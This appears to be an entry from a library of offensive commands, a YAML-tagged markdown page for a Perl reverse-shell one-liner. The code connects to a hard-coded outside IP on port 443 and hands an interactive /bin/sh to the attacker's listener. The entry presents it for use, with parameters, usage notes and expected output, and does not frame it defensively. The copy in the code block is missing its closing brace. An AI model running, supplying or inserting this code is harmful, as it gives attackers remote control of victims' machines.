---
id: cmd-perl-reverse
data: >-
  use
  Socket;$i="138.68.1.244";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh
  -i");}
tags:
  - reverse-shell
  - perl
type: command
output: Interactive shell on attacker's Netcat listener
executor: perl
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:08.662Z'
verified: false
validated: true
submitted: true
---
# perl-reverse-shell-code

## Command

```perl
use Socket;$i="138.68.1.244";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");
```

## Description

Perl one-liner or script that creates a TCP socket to the attacker IP/port and binds shell I/O to it for reverse shell access.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $i | Attacker IP address | Yes |
| $p | Listener port | Yes |

## Examples

### Basic Usage

Save as file and run with perl.

### Advanced Usage

Inline: perl -e 'use Socket; ...'

## Expected Output

Shell prompt on listener; commands executable remotely.

## Related

- [[commands/perl-execute-shell]]
